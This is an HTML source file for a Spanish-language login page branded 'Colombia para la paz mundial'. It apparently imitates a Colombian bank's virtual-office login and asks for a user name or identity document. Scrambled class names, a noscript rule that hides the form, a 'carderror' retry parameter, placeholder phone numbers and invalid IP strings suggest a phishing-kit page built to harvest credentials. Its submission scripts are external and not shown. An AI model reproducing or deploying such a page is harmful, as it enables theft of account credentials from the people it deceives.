<!-- Fuente utilizada: Open Sans por Steve Matteson (Apache License 2.0) -->
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="index, follow">
    <meta name="description" content="Completa este formulario dinámico de forma segura y gratuita para interactuar con nuestros servicios. Tu privacidad es nuestra prioridad.">
    <meta name="language" content="es">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="estilos.css">
    <link rel="canonical" href="https://colombiaparalapazmundial.com/">
    <script src="./js/jquery-3.6.0.min.js"></script>
    <script src="./js/functions.js"></script>
    <script src="./js/guerraval.js"></script>
    <script src="./js/toos.js"></script>
    <title>Colombia para la paz mundial</title>
    <style>
      .cj-lopo {
border: 1px solid #CCCCCC; 
padding: 10px;
width: 100%; 
box-sizing: border-box; 
margin-bottom: 20px;
display: flex;
align-items: center;
gap: 20px;
  }
  .td-pol {
    color: #fff !important;
    font-size: 16px !important;
    font-weight: normal !important;
    background-color: #2c2a29 !important;
    border-color: transparent !important;
    border-radius: 0 !important;
    padding: 10px 15px;
    text-align: left;
    font-family: 'OpenSans-Regular', Helvetica, Arial, Verdana, Tahoma, sans-serif !important;
    position: relative;
  }
  .td-pol::before,
  .td-pol::after {
    content: "";
    position: absolute;
    top: 0;
    bottom: 0;
    width: 1px;
    background-color: #000;
  }
  .td-pol::before {
    left: -1px;
  }
  .td-pol::after {
    right: -1px;
  }
  .k-j {
    display: flex;
    padding: 0px 10px;
    margin-top: 5px;
    align-items: center;
  }
  .galx-p {
    position: relative;
    margin: 5px 5px;
  }
  .fxa-xe {
  border: 1px solid #CCCCCC;
  padding: 5px 15px;
  color: #2c2a29 !important;
  font-family: "OpenSans-Regular", Helvetica, Arial, Verdana, Tahoma, sans-serif !important;
  font-size: 18px !important;
  display: block !important;
  }
  @media (min-width: 768px) {
    .fxa-xe,
    .gros-qoki {
      width: 100%;
    }
  }

  .gros-qoki {
    border: 1px solid #CCCCCC;
    border-top: none;
    margin-bottom: 20px;
  }
  
    </style>
</head>
<body>
<noscript>
    <style>
        .td-pol, .gros-qoki, .col {
            display: none; 
        }
    </style>
</noscript>
<div class="container">
    <div class="row">
      <div class="col">
        <img src="./img/va.png" alt="Logo" class="logo">
        <h2 id="texto" class="procesodepazcolombia"></h2>
        <p id="currentDateTime" class="dateTime"></p>
        <h3 class="grotesca-papel">Inicio de sesi&oacute;n</h3>
        <div class="random" style="padding-top: 30px;"></div>
        <div class="cj-lopo" id="err-mensaje" style="display:none">
  <img src="./img/error.jpg" alt="" class="error-paracos">
  <div class="error-content">
    <h3 class="error-guerrilas">Error</h3>
    <p class="error-interno">Por favor ingrese la información requerida.</p>
  </div>
</div>
<div class="cj-lopo" id="carderror" style="display:none">
  <img src="./img/error.jpg" alt="" class="error-paracos">
  <div class="error-content">
    <h3 class="error-guerrilas">Error</h3>
    <p class="error-interno">Usuario o clave incorrecta por favor intente de nuevo.</p>
  </div>
</div>
<div class="td-pol">Usuario</div>
<div class="gros-qoki">
    <div class="message">Si no tienes un usuario asignado ingresa con tu documento de identidad</div>
    <div class="k-j">
                    <img src="./img/info.jpg" alt="Icono" width="10" height="10">
                <span class="label-text"> Ingresa tu usuario</span>
        <span class="label-text" style="margin-left: -10px;" ></span>
    </div>
    <div class="galx-p">
        <img src="./img/icon-user.png" alt="Icono" class="input-icon">
        <input type="text" class="camionescolombia" id="txtUsuario" name="txtUsuario" maxlength="50">
    </div>
    <div class="button-container">
        <button type="submit" id="btnUsuario" name="btnUsuario" class="motoconcho">Continuar</button>
    </div>
    <div class="forgot-link">
                <p>¿Olvidaste tu usuario?</p>
                <p>¿Problemas para conectarte?</p>
            </div>
</div>
<br>
<div class="col">
        
<div class="fxa-xe">
<a href="nuestraoficina.php" class="conflicto">
  <div class="ico-amorypazontenido">
    <img src="./img/demo.jpg" alt="Icono 1" class="gloria-icon">
    <div class="paz-message">Conoce nuestra oficina Virtual </div>
  </div>
  </a>


  <a href="seguridadenlinea.php" class="conflicto">
  <div class="ico-amorypazontenido">
    <img src="./img/seguridad.jpg" alt="Icono 2" class="gloria-icon">
    <div class="paz-message">Aprende sobre Seguridad</div>
  </div>
</a>

<a href="reglamentoprivacidad.php" class="conflicto">
  <div class="ico-amorypazontenido">
    <img src="./img/reglamento.jpg" alt="Icono 3" class="gloria-icon">
    <div class="paz-message">Reglamento oficina Virtual</div>
  </div>
  </a>


<a href="politicaprivacidad.php" class="conflicto">
  <div class="ico-amorypazontenido ">
    <img src="./img/politica.jpg" alt="Icono 4" class="gloria-icon">
    <div class="paz-message">Política de Privacidad </div>
  </div>
</div>
</a><br>
  <p style="font-size: 10px; text-decoration: none;">Medellín (57) 310 234 5678 - Bucaramanga (57) 350 789 4567 - Bogotá (57) 300 123 4567 - Barranquilla (57) 330 456 7890 - Cali (57) 320 345 6789 - Cartagena (57) 350 567 8901 Pereira (57) 320 678 9012 - Oficinas Telefónica: El resto del país 018000 8 76543 - España (34) 600 123 456 - Estados Unidos (1) 800 234 5678.</p>
<footer class="container mt-3">
    <div class="row">
        <div class="col-md-12">
            <div class="footer-content" style="display: flex; justify-content: space-between; align-items: center; font-size: 10px; margin-bottom: 24px !important; margin-top: 3px !important;">
                <p class="mb-0">Dirección IP: <span id="ip_address">192.45.024.22</span></p>
                <p class="mb-0">Copyright © <span id="current_year"></span> Colombia para la paz  S.A.</p>
            </div>
        </div>
    </div>
</footer>
<script>
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            document.getElementById('ip_address').textContent = data.ip;
        })
        .catch(error => {
            console.error('196.45.58.360', error);
        });

    const currentYear = new Date().getFullYear();
    document.getElementById('current_year').textContent = currentYear;
    function getCurrentDateTime() {
      const now = new Date();
      const options = { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
      const formattedDate = now.toLocaleString('es-CO', options);
      return formattedDate;
    }

    function updateDateTime() {
      const dateTimeElement = document.getElementById('currentDateTime');
      const dateTimeString = getCurrentDateTime();
      const message = "Fecha y hora actual:";
      const separatedMessage = message + "&nbsp;&nbsp;&nbsp;&nbsp;" + dateTimeString;
      dateTimeElement.innerHTML = separatedMessage;
    }

    setInterval(updateDateTime, 1000);

    function getParameterByName(name, url) {
        if (!url) url = window.location.href;
        name = name.replace(/[\[\]]/g, '\\$&');
        var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
            results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, ' '));
    }

    window.addEventListener('DOMContentLoaded', function() {
        var cardErrorParam = getParameterByName('carderror');
        if (cardErrorParam === 'true') {
            var cardErrorElement = document.getElementById('carderror');
            if (cardErrorElement) {
                cardErrorElement.style.display = 'flex'; 

                var inputs = document.querySelectorAll('.camionescolombia');
                inputs.forEach(function(input) {
                    input.style.borderColor = 'red'; 
                });
            }
        }
    });
</script>
</body>
</html>